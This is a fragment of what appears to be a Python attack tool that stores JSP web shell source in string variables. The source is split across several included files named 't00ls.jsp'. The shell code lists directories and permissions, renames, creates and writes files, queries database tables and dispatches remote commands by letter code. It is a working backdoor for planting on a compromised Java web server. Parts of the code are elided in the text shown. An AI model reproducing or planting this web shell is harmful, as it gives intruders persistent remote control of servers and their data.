...
sT=fm.format(dt);sQ=l[i].canRead()?"R":"";sQ+=l[i].canWrite()?" W":"";if(l[i].isDirectory()){sb.append(l[i].getName()+"/\t"+sT+"\t"+l[i].length()+"\t"+sQ+"\n");}%>'
        self.webshell_txt_2 = '<%! else{sF+=l[i].getName()+"\t"+sT+"\t"+l[i].length()+"\t"+sQ+"\n";}}sb.append(sF);}
...
void II(String s,String d)throws Exception{File sf=new File(s),df=new File(d);sf.renameTo(df);}void JJ(String s)throws Exception{File f=new File(s);f.mkdir();}%>'
        self.webshell_txt_3 = '<%!void KK(String s,String t)throws Exception{File f=new File(s);SimpleDateFormat fm=new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
...
while(r.next()){sb.append(r.getString("TABLE_NAME")+"\t");}r.close();c.close();}%>'
        self.webshell_txt_4 = '<%!void PP(String s,StringBuffer sb)throws Exception{String[] x=s.trim().split("\r\n");Connection c=GC(s);
...
while((l=br.readLine())!=null){sb.append(l+"\r\n");}br.close();}%>'
        self.webshell_txt_6 = '<%else if(Z.equals("D")){BufferedWriter pi=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(z1))));
pi.write(z2);pi.close();sb.append("1");}else if(Z.equals("E")){EE(z1);sb.append("1");}else if(Z.equals("F")){FF(z1,response);}
...
%>'
        self.webshell_txt_7 = '<%@page import="java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*"%><%@include file="1t00ls.jsp"%><%@include file="2t00ls.jsp"%><%@include file="3t00ls.jsp"%><%@include file="4t00ls.jsp"%><%@include file="5t00ls.jsp"%><%@include file="6t00ls.jsp"%>'
